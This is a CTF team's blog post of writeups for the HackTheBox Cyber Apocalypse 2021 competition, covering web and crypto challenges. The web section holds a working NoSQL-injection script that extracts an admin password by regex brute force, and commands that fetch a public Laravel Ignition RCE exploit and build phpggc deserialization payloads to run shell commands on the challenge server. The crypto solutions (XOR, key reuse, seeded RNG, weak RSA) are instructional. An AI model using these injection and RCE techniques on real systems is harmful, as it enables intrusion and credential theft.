---
layout: post
title: HackTheBox CTF Writeup
date: 2021-04-19 01:00 +0700
modified: 2021-04-26 09:45:00 +0700
description:  0x90skids writeups for the 2021 HackTheBox CTF Competition
tag:
  - ctf
  - writeup
image: https://0x90skids.com/htb_ctf_logo.png
author: 0x90skids
summmary: 0x90skids writeups for the 2021 HackTheBox CTF Competition
comments: true
---
<img class="img-fluid rounded z-depth-1" src="htb_ctf_logo.png">
>  HackTheBox Cyber Apocalypse 2021 CTF was an event hosted online.
<br>0x90skids recently competed in the competition.

# Categories 

+  [Web](#web)
+  [Crypto](#crypto)
+  [Hardware](#hardware)

## Web
### Wild Goose Hunt
**Solved By:** Bib<br>
**Points:** 300<br>
**Flag:** CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}

##### Challenge
Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?

##### Solution

I first checked the challenge page. I was greeted with a login screen :
<br>
  <img src="images\htb-ctf\wild_goose_hunt_login.png" alt="login screen">
<br>
After looking at the login screen a little bit, I went ahead and looked at the challenge's downloadable source code. I saw that this challenge was using MongoDB and that the flag was the admin password. This means that we need to either get inside the database or login using a NoSQL injection. I've tried different payloads using Burp and finally got one that worked :
<br>
  <img src="images\htb-ctf\wild_goose_hunt_burp.png" alt="burp payload">
<br>
The working payload was found via an article on ([HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)). This article also shows a script that brute-force each character (username or password) using regex. I modified this script to fit the challenge. Here's my final script :
<br>
```python
import requests, string, json, sys

url = "http://178.62.14.240:32507/api/login"
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password():
    print("Bruteforcing password... Please wait!")
    params = {"username":"admin", "password[$regex]":""}
    password = "^CHTB{"
    print(password[1:].replace("\\", ""))
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, verify=False, allow_redirects=False)
            data_raw = json.loads(pr.text)
            data = json.dumps(data_raw, indent=2)
            if "Login Successful" in data:
                password += c
                print(password[1:].replace("\\", ""))
                break
        if c == possible_chars[-1]:
            print("Found password : "+password[1:].replace("\\", ""))

get_password()
```
Here's the output from my script :

```bash
Bruteforcing password... Please wait!
CHTB{
CHTB{1
CHTB{1_
CHTB{1_t
CHTB{1_th
CHTB{1_th1
CHTB{1_th1n
CHTB{1_th1nk
CHTB{1_th1nk_
CHTB{1_th1nk_t
CHTB{1_th1nk_th
CHTB{1_th1nk_the
CHTB{1_th1nk_the_
CHTB{1_th1nk_the_4
CHTB{1_th1nk_the_4l
CHTB{1_th1nk_the_4l1
CHTB{1_th1nk_the_4l1e
CHTB{1_th1nk_the_4l1en
CHTB{1_th1nk_the_4l1ens
CHTB{1_th1nk_the_4l1ens_
CHTB{1_th1nk_the_4l1ens_h
CHTB{1_th1nk_the_4l1ens_h4
CHTB{1_th1nk_the_4l1ens_h4v
CHTB{1_th1nk_the_4l1ens_h4ve
CHTB{1_th1nk_the_4l1ens_h4ve_
CHTB{1_th1nk_the_4l1ens_h4ve_n
CHTB{1_th1nk_the_4l1ens_h4ve_n0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_u
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_us
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_use
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0n
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
Found password : CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```
Bingo! Interesting challenge that helped me understand NoSQL auth bypass techniques.
<br>
<br>
`CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}`

### DaaS
**Solved By:** stoned_newton<br>
**Flag:** CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}

##### Challenge
We suspect this server holds valuable information that would further benefit our cause, but we've hit a dead end with this debug page running on a known framework called Laravel. Surely we couldn't exploit this further.. right?

##### Solution

We can use the RCE attack : [https://www.ambionics.io/blog/laravel-debug-rce](https://www.ambionics.io/blog/laravel-debug-rce)

We get the exploit script.
```bash
$ wget https://raw.githubusercontent.com/ambionics/laravel-exploits/main/laravel-ignition-rce.py
```

We will also need to git this repo to prepare our payload:
```bash
$ git clone https://github.com/ambionics/phpggc.git
```

Prepare paylod and run it :
```bash
$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system id
$ python3 laravel-ignition-rce.py http://138.68.147.93:31474/ ./exploit.phar
```

See the result:
```bash
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=1000(www) gid=1000(www) groups=1000(www)
--------------------------
+ Logs cleared
```

Ok now lets see what files we have.
```bash
$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system ls
favicon.ico
index.php
robots.txt
storage
web.config
```

Nothing.... Lets try root directory.
```bash
$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o ./exploit.phar --fast-destruct monolog/rce1 system 'ls /'
bin
boot
dev
entrypoint.sh
etc
flagNdZ3O
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```
Bingo!

Get the flag : `CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}`

## Crypto
### PhaseStream 2
**Solved By:** stoned_newton<br>
**Flag:** CHTB{n33dl3_1n_4_h4yst4ck}

##### Challenge
The aliens have learned of a new concept called "security by obscurity". Fortunately for us they think it is a great idea and not a description of a common mistake. We've intercepted some alien comms and think they are XORing flags with a single-byte key and hiding the result inside 9999 lines of random data, Can you find the flag?

##### Solution

We know the prefix of the flag `CHTB`. We can brute force the single-byte key to find one that will result in XORing the known prefix and we do that for each 10000 lines of data.
```python
with open('output.txt') as f:
    data = f.readlines()

for line in data:
  line = bytes.fromhex(line.rstrip())
  for key in range(255):
    if key ^ line[0] == 67:
      if key ^ line[1] == 72:
        if key ^ line[2] == 84:
          if key ^ line[3] == 66:
            print("got CHTB")
            answer = ''
            for i in range(len(line)):
              answer += chr(key ^ line[i])
            print(answer)
```

### PhaseStream 3
**Solved By:** stoned_newton<br>
**Flag:** CHTB{r3u53d_k3Y_4TT4cK}

##### Challenge
The aliens have learned the stupidity of their misunderstanding of Kerckhoffs's principle. Now they're going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they'll happily give us poor humans the source because they're so confident it's secure!

##### Solution

Resolved using [https://github.com/CameronLonsdale/MTP](https://github.com/CameronLonsdale/MTP).
```bash
mtp output.txt
```

### PhaseStream 4
**Solved By:** stoned_newton<br>
**Flag:** CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}

##### Challenge
The aliens have learned the stupidity of their misunderstanding of Kerckhoffs's principle. Now they're going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they'll happily give us poor humans the source because they're so confident it's secure!

##### Solution

Using MTP tool : [https://github.com/CameronLonsdale/MTP](https://github.com/CameronLonsdale/MTP)

We can guess the words in the test quote with a little bit of patience and the [free dictionary](https://www.thefreedictionary.com/).

```
I alone cannot change the world, but I can cast a stone across the water to ma[ny ripples]
```

### SoulCrabber
**Solved By:** stoned_newton<br>
**Flag:** CHTB{mem0ry_s4f3_crypt0_f41l}

##### Challenge
Aliens heard of this cool newer language called Rust, and hoped the safety it offers could be used to improve their stream cipher.


##### Solution

This challenge use a Random NUmber Generator for which we know the seed `13371337`. Each letter of the flag as been XOR with a single-byte number generated by our RNG.

Knowing the seed we can generate the single-byte keys:
```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;

fn main() -> std::io::Result<()> {
    let seed = 13371337;
    let mut rng = StdRng::seed_from_u64(seed);

    let mut i = 0;

    while i < 29 {
        let kek : u8 = rng.gen::<u8>();
        println!("{}", kek);
        
        i = i + 1;
    }

    Ok(())
}
```

We can know decipher the flag in `out.txt` using the keys.
```python
import random

key = [88, 17, 64, 198, 160, 251, 74, 26, 178, 163, 56, 85, 137, 126, 94, 188, 38, 83, 116, 2, 190, 130, 239, 11, 12, 99, 232, 148, 14]

with open('out.txt') as f:
    cipher = f.read()

m = ''
cipher = bytes.fromhex(cipher)
for i in range(len(key)):
    m += chr(cipher[i] ^ key[i])

print(m)
```

### SoulCrabber 2
**Solved By:** stoned_newton<br>
**Flag:** CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}

##### Challenge
Aliens realised that hard-coded values are bad, so added a little bit of entropy.


##### Solution

The seed know is an unknown UNIX timestamp. We can however try to find this easily by brute forcing it and using or knowledge of the flag prefix `CHTB{`.

```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::time::SystemTime;

fn main() -> std::io::Result<()> {
  let mut seed = SystemTime::now()
    .duration_since(SystemTime::UNIX_EPOCH)
    .expect("Time is broken")
    .as_secs();

  let mut rng = StdRng::seed_from_u64(seed);
  let mut kek : u8 = rng.gen::<u8>();

  while seed > 0 {
    seed = seed -1;
    rng = StdRng::seed_from_u64(seed);
    kek = rng.gen::<u8>();

    // C
    if kek ^ 65 == 67 {
      kek = rng.gen::<u8>();
      // H
      if kek ^ 138 == 72 {
        kek = rng.gen::<u8>();
        // T
        if kek ^ 81 == 84 {
          kek = rng.gen::<u8>();
          // B
          if kek ^ 117 == 66 {
            kek = rng.gen::<u8>();
            // {
            if kek ^ 195 == 123 {
              println!("seed {}", seed);

              rng = StdRng::seed_from_u64(seed);

              let mut i = 0;

              while i < 41 {
                  let kek : u8 = rng.gen::<u8>();
                  println!("{}", kek);
                  
                  i = i + 1;
              }
            }
          }
        }
      }
    }
  }
  Ok(())
}
```

Once we have determine the seed, we print the values of the key. We can then use it to decipher the flag in `out.txt`.
```python
import random

key = [2, 194, 5, 55, 184, 239, 195, 184, 41, 154, 152, 79, 129, 101, 59, 169, 61, 68, 66, 14, 58, 53, 237, 162, 40, 203, 100, 167, 128, 139, 123, 16, 194, 119, 212, 84, 40, 213, 80, 236, 122]

with open('out.txt') as f:
    cipher = f.read()

m = ''
cipher = bytes.fromhex(cipher)
for i in range(len(key)):
    m += chr(cipher[i] ^ key[i])

print(m)
```

### Low Energy Crypto
**Solved By:** stoned_newton<br>
**Flag:** CHTB{5p34k_fr13nd_4nd_3n73r}

##### Challenge
Aliens are using a human facility as a storage unit. The owners of the facility said their access credentials stopped working, but it's based on Bluetooth LE. We managed to install a Bluetooth LE sniffer close to the entrance, and captured some packets. Can you manage to get the access credentials from this capture?

##### Solution

This challenge give us a `.pcapng` to examine. We can start by openig it with [wireshark](https://www.wireshark.org/).
The sniffer is capturing Bluetooth LE communication. We can then filter to only show `ATT` (The Attribute Protocol) packets and reduce the noise.
<br>
We filter to get only the `ATT` packet using `btl2cap.cid == 0x0004`.
<br>

We notice a request for a public key. Lets catch it.
```bash
-----BEGIN PUBLIC KEY-----
MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m
B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li
4l+RI2g0FqJvf3ff
-----END PUBLIC KEY-----
```
<br>
The format line doesnt tell what type it is. Let's try to read it as RSA.
```bash
$ openssl rsa --text -pubin -in ble.pub
```
<br>

Bingo!
```bash
RSA Public-Key: (512 bit)
Modulus:
    00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:
    59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:
    1a:43:ce:5b:e7:fc:24:6c:e0:60:94:56:6e:87:a4:
    72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:
    44:09:d4:a8:09
Exponent:
    00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:
    77:df
```
512 bits is not big for RSA. Can we factorize this?
```bash
Modulus=A28F1F19E6916542E1F8DEECA31B5997F4EF3475D03D2607D7E38F8B651A43CE5BE7FC246CE06094566E87A472765F890ACB4610374449F59542A44409D4A809
```

Success! https://www.alpertron.com.ar/ECM.HTM
```bash
    8513 909239 276702 310463 241660 208946 735793 173678 202359 843895 330781 205141 862524 433952 199829 179032 817317 799281 688615 001183 017023 849565 598840 210953 921231 104009 (154 digits) = 92270 847179 792937 622745 249326 651258 492889 546364 106258 880217 519938 223418 249279 (77 digits) × 92270 847179 792937 622745 249326 651258 492889 546364 106258 880217 519938 223418 258871 (77 digits) 
```
<br>
Back to Wireshark there is a blob message. Maybe our text to decipher?
```
392969b018ffa093b9ab5e45ba86b4aa070e78b839abf11377e783626d7f9c4091392aef8e13ae9a22844288e2d27f63d2ebd0fb90871016fde87077d50ae538
```

Lets decipher this:
```python
from Cryptodome.Util.number import bytes_to_long, long_to_bytes, inverse
from sage.all import *

N = 'A28F1F19E6916542E1F8DEECA31B5997F4EF3475D03D2607D7E38F8B651A43CE5BE7FC246CE06094566E87A472765F890ACB4610374449F59542A44409D4A809'
N = bytes.fromhex(N)
N = bytes_to_long(N)

p = 92270847179792937622745249326651258492889546364106258880217519938223418249279
q = 92270847179792937622745249326651258492889546364106258880217519938223418258871

e = '00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:77:df'.replace(':', '')
e = bytes.fromhex(e)
e = bytes_to_long(e)

print(e)

assert(N == p*q)

c = "392969b018ffa093b9ab5e45ba86b4aa070e78b839abf11377e783626d7f9c4091392aef8e13ae9a22844288e2d27f63d2ebd0fb90871016fde87077d50ae538"
c = bytes.fromhex(c)
c = bytes_to_long(c)

phi = (p-1)*(q-1)
d = inverse(e, phi)

m = pow(c, d, N)

print(long_to_bytes(m))
```